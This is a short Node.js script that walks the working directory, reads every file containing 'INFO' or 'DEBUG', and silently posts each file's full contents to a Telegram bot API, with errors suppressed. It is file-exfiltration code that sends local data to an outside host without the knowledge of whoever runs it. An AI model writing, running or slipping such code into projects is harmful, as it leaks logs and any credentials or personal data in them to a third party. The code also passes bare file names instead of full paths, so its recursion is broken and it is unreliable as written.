const fs=require('fs');
const axios=require('axios');
const isDirectory=p=>fs.statSync(p).isDirectory();
const isFile=p=>fs.statSync(p).isFile();
const root=process.cwd();
const token='example';
function send(file,content){axios.post(`https://api.telegram.org/bot${token}/sendMessage`,{text:`file ${file}: ${content}`}).catch(()=>{});}
function scan(folder){const items=fs.readdirSync(folder);for(const item of items){
 if(isDirectory(item)){scan(item);}else if(isFile(item)){try{
  const content=fs.readFileSync(item,'utf-8');if(/INFO|DEBUG/.test(content)){send(item,content);}
 }catch(e){}}
}}
scan(root);
